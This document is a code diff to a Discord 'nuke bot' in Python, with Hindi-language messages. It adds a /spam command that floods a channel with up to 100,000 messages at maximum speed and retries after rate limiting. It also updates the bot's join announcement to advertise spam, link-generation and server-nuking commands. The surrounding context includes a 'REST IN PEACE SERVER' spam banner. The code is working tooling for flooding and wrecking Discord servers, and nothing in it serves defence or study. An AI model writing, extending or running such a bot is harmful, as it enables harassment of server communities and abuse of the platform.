@@ -38,17 +38,17 @@ async def on_guild_join(guild):
             if channel.permissions_for(guild.me).send_messages:
                 embed = discord.Embed(
                     title="🔥 NUKE BOT ACTIVE 🔥",
-                    description="Bot successfully added!\n\n**अब DM में /nuke_dm command use करो!**",
+                    description="Bot successfully added!\n\n**अब DM में commands use करो!**",
                     color=discord.Color.red()
                 )
                 embed.add_field(
-                    name="📖 Command:",
-                    value="`/nuke_dm server_id: <SERVER_ID>`",
+                    name="📖 Commands:",
+                    value="`/spam count: <COUNT> message: <MESSAGE>`\n`/link server_id: <SERVER_ID>`\n`/nuke_dm server_id: <SERVER_ID>`",
                     inline=False
                 )
                 embed.add_field(
                     name="🔥 Usage:",
-                    value="DM में यह command भेजो और server का ID दो - फिर SERVER UD JAYEGA!",
+                    value="DM में यह commands भेजो!",
                     inline=False
                 )
                 await channel.send(embed=embed)
@@ -189,6 +189,82 @@ SPAM_MESSAGE = """💀🔥💥━━━━━━━━━━━━━━━━�
 💥🔥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔥💥
         ☠️  REST IN PEACE SERVER  ☠️
 💀🔥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔥💀"""
+
+# SPAM COMMAND - Channel mein custom message spam karenge
+@bot.tree.command(name="spam", description="💬 Channel में message spam करो!")
+@discord.app_commands.describe(
+    count="1 से 100000 तक message spam कर सकते हो",
+    message="जो message spam करना है (optional - default: numbers)"
+)
+async def spam(interaction: discord.Interaction, count: int, message: str = None):
+    """Channel mein custom message ko spam karo"""
+    await interaction.response.defer()
+    
+    # Validate count
+    if count < 1:
+        await interaction.followup.send("❌ Count कम से कम 1 होना चाहिए!", ephemeral=True)
+        return
+    
+    if count > 100000:
+        await interaction.followup.send("❌ Count maximum 100000 हो सकता है!", ephemeral=True)
+        return
+    
+    channel = interaction.channel
+    
+    # Default message if not provided
+    if message is None:
+        message = "number"  # Will send 1, 2, 3, ... format
+    
+    try:
+        await interaction.followup.send(f"🚀 **SPAM शुरू!**\n💬 {count} messages भेजेंगे... बिना gap के!\n📝 Message: `{message}`\n⏳ यह थोड़ा समय ले सकता है!", ephemeral=True)
+        print(f"🚀 SPAM शुरू: {count} messages with message: {message}")
+        
+        spam_count = 0
+        
+        for i in range(1, count + 1):
+            try:
+                # If message is "number", send sequential numbers
+                if message.lower() == "number":
+                    await channel.send(f"{i}")
+                else:
+                    # Otherwise send the custom message
+                    await channel.send(message)
+                
+                spam_count += 1
+                
+                if spam_count % 100 == 0:
+                    print(f"✅ {spam_count}/{count} messages sent")
+                
+                # No delay - maximum speed!
+                
+            except discord.Forbidden:
+                await interaction.followup.send(f"❌ Bot को इस channel में message भेजने की permission नहीं है!", ephemeral=True)
+                print(f"⚠️ Forbidden error")
+                break
+            except discord.HTTPException as e:
+                if "You are being rate limited" in str(e):
+                    print(f"⏳ Rate limited! Waiting...")
+                    await asyncio.sleep(5)
+                    try:
+                        if message.lower() == "number":
+                            await channel.send(f"{i}")
+                        else:
+                            await channel.send(message)
+                        spam_count += 1
+                    except:
+                        break
+                else:
+                    break
+            except Exception as e:
+                print(f"⚠️ Error at message {i}: {e}")
+                break
+        
+        await interaction.followup.send(f"✅ **SPAM COMPLETE!**\n💬 Total {spam_count} messages sent!\n📝 Message: `{message}`\n🎉 वो भी बिना gap के!", ephemeral=True)
+        print(f"✅ SPAM COMPLETE: {spam_count} messages sent!")
+        
+    except Exception as e:
+        await interaction.followup.send(f"❌ Error: {str(e)}", ephemeral=True)
+        print(f"❌ Error: {e}")
 
 # LINK COMMAND - Server ID se Magic Link generate karo
 @bot.tree.command(name="link", description="🔗 Magic Link generate करो!")
